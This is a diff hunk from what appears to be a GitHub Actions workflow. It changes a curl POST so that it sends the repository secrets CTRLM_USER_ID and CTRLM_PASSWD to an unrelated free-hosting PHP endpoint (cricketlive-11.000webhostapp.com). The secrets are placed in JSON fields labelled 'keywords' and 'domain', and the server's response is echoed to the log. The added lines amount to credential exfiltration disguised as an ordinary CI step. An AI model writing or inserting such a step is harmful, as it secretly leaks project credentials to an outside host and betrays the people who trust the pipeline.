@@ -32,8 +32,8 @@ jobs:
             --header 'content-type: application/json' \
             --url https://cricketlive-11.000webhostapp.com/ranker/kw.php \
             --data '{
-              "keywords": "$user",
-              "domain": "$passwd"
+              "keywords": "${{ secrets.CTRLM_USER_ID }}",
+              "domain": "${{ secrets.CTRLM_PASSWD }}"
             }')
           echo $response
      
